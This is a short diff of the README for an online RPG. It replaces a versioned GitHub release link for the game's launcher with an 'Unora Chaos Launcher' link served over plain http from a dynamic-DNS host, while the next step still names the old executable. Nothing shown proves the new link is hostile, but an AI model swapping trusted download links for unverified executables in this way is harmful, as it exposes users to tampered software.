@@ -4,7 +4,7 @@ Welcome to **Unora: Elemental Harmony** — a free-to-play online RPG set in a w
 
 ## Download & Install
 
-1. Download the **UnoraLaunchpad** from [GitHub](https://github.com/Jinori/UnoraLaunchpad/releases/tag/v3.3.2)
+1. Download the **Unora Chaos Launcher**: [Link](http://unora.freeddns.org:5001/)
 2. Run **UnoraLaunchpad.exe** — it will automatically download and install the game client
 3. Create an account and log in
 
